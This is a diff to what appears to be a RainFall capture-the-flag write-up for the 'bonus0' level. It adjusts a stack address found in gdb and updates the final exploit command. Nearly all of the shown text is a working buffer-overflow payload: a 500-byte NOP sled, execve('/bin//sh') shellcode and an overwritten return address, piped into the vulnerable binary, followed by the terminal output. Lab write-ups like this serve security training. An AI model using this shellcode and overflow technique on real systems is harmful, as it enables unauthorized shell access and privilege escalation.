@@ -149,14 +149,14 @@ Starting program: /home/user/bonus0/bonus0
 
 Breakpoint 1, 0x080484d0 in p ()
 (gdb) x $ebp-0x1008
-0xbfffe580:	0x00000000   --> our start address is 0xbfffe580
+0xbfffe680:	0x00000000   --> our start address is 0xbfffe680
 
-So we pick a random place in our NOP instruction  (+61 to + 500) we took +250 -> 0xbfffe67a
+So we pick a random place in our NOP instruction  (+61 to + 500) we took +250 -> 0xbfffe77a
 
-Final payloa : (python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "\x90" * 9 + "\x7a\xe6\xff\xbf" + "\x90" * 7'; cat) | ./bonus0
+Final payloa : (python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "\x90" * 9 + "\x7a\xe7\xff\xbf" + "\x90" * 7'; cat) | ./bonus0
 
 
-bonus0@RainFall:~$ (python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "\x90" * 9 + "\x7a\xe6\xff\xbf" + "\x90" * 7'; cat) | ./bonus0
+bonus0@RainFall:~$ (python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "\x90" * 9 + "\x7a\xe7\xff\xbf" + "\x90" * 7'; cat) | ./bonus0
  - 
  - 
 �����������������������������z������������� ���������z�������������
